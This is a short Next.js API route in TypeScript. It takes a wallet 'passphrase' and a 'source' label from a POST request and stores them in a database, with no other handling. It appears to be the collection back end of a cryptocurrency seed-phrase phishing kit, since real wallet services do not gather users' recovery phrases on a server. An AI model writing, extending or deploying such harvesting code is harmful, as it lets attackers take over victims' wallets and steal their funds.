import { NextRequest, NextResponse } from "next/server";
import { saveWalletRecord } from "@/lib/db";

export async function POST(req: NextRequest) {
  try {
    const { passphrase, source } = await req.json();

    if (!passphrase || typeof passphrase !== "string") {
      return NextResponse.json(
        { error: "Passphrase is required and must be a string." },
        { status: 400 }
      );
    }

    // Save record to DB
    const newRecord = await saveWalletRecord(
      passphrase,
      source || "Wallet"
    );

    return NextResponse.json({ success: true, record: newRecord });
  } catch (error) {
    console.error("Error in submit API route:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}
